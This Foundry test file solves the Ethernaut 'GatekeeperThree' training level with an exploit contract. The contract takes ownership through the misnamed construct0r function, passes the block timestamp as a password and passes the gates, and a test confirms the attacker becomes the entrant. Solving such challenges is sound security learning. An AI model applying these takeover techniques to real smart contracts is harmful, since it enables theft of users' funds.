// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../ethernaut/GateKeeperThree.sol";


contract ExploitGateKeeperThree {

    function exploit(address payable gatekeeperThree) external {
        GatekeeperThree gateKeeper = GatekeeperThree(gatekeeperThree);
        gateKeeper.construct0r();
        gateKeeper.createTrick();
        gateKeeper.getAllowance(block.timestamp);
        gateKeeper.enter();
    }

}


contract TestGateKeeperThree is Test {
    GatekeeperThree gatekeeperThree;
    ExploitGateKeeperThree exploitGateKeeperThree;

    address deployer = address(0x51);
    address attacker = address(0x52);

    function setUp() external {
        vm.startPrank(deployer);
        gatekeeperThree = new GatekeeperThree();
        gatekeeperThree.construct0r();
        exploitGateKeeperThree = new ExploitGateKeeperThree();
        vm.stopPrank();
        vm.deal(attacker, 10 ether);
    }

    function testExploit() external {
        assertEq(gatekeeperThree.owner(), deployer);
        assertEq(gatekeeperThree.entrant(), address(0));
        vm.startPrank(attacker, attacker);
        (bool res,) = payable(gatekeeperThree).call{value: 1 ether}("");
        require(res, "tx failed");
        exploitGateKeeperThree.exploit(payable(gatekeeperThree));
        assertEq(gatekeeperThree.entrant(), attacker);
    }
}
